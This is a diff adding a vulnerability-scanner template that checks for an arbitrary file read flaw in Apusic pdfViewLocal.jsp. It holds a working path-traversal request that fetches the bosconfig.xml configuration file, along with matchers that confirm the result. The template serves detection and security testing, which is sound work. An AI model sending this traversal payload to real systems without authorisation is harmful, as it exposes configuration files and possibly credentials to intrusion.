@@ -1,0 +1,29 @@
+id: apusic-pdfviewlocal-fileread
+
+info:
+  name: "Apusic pdfViewLocal 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Apusic
+  description: |
+    This template detects an arbitrary file read vulnerability in Apusic pdfViewLocal, where files like bosconfig.xml can be accessed by manipulating the path.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/easweb/logout/../cp/dm/pdfViewLocal.jsp?path=../config/bosconfig.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?xml version"
+          - "<config>"
+          - "<attribute key"
+        part: body
+      - type: word
+        words:
+          - "application/pdf"
+        part: header
